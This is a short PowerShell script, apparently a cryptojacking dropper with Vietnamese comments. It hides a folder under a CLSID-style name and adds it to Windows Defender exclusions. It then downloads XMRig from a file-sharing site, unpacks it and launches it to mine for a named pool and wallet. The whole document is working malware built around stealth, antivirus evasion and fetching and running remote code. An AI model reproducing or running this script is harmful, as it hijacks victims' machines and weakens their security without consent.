
$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

# tải miner cho SkibiditoiletMiner
$url = "https://anonsharing.com/file/fcd511aeb8b96fef/xmrig-6.21.0.zip"
$zipPath = "$dir\xmrig.zip"
Invoke-WebRequest -Uri $url -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $dir -Force

$xmrigPath = "$dir\xmrig-6.21.0\xmrig.exe"  # Đường dẫn đến xmrig.exe
$pool = "stratum+ssl://rx-asia.unmineable.com:443"
$wallet = "ATOM:cosmos1nqp27fnn3uuyy7xrvu2epdw7592uapmptfx06g.lmaokid"
$password = "TAOSIEUDEPTRAI"

Start-Process -FilePath $xmrigPath -ArgumentList "-a rx -o $pool -u $wallet -p $password" -NoNewWindow
